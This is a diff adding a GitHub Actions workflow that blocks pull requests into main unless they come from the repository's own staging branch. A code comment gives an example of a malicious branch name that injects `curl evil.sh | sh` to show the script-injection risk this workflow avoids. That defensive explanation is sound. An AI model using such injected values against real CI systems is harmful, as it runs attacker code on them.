@@ -1,0 +1,48 @@
+# Enforces the branch hierarchy of AGENTS.md section 9: `main` only ever receives
+# changes that came through `staging`.
+#
+# GitHub has no native rule for "this pull request must come from branch X" (the
+# available ruleset rules are: restrict creations/updates/deletions, linear
+# history, required deployments, signed commits, require a pull request, required
+# status checks, block force pushes, secret/code scanning and file path/size
+# restrictions -- none of them looks at where the pull request came from). So the
+# policy is enforced as a check that fails, and "PR must come from staging" is
+# marked as a required status check on `main`. The merge stays blocked until it
+# passes, which is exactly as binding as a native rule.
+name: Branch policy
+
+on:
+  pull_request:
+    branches:
+      - main
+
+permissions:
+  contents: read
+
+jobs:
+  source-branch:
+    name: PR must come from staging
+    runs-on: ubuntu-latest
+    steps:
+      # The values are passed through the environment instead of being
+      # interpolated into the script. `github.head_ref` is attacker-controlled
+      # (anyone can name a branch in their fork), and interpolating it into `run`
+      # is the classic Actions script-injection mistake: a branch named
+      # `staging"; curl evil.sh | sh; #` would execute here.
+      - name: Verify the source branch
+        env:
+          HEAD_REF: ${{ github.head_ref }}
+          HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
+          BASE_REPO: ${{ github.repository }}
+        run: |
+          if [ "$HEAD_REPO" != "$BASE_REPO" ]; then
+            echo "::error::Pull requests into 'main' must come from a branch of $BASE_REPO. This one comes from the fork $HEAD_REPO."
+            exit 1
+          fi
+
+          if [ "$HEAD_REF" != "staging" ]; then
+            echo "::error::Pull requests into 'main' must come from 'staging'. This one comes from '$HEAD_REF'. See AGENTS.md section 9."
+            exit 1
+          fi
+
+          echo "Source branch '$HEAD_REF' is allowed into 'main'."
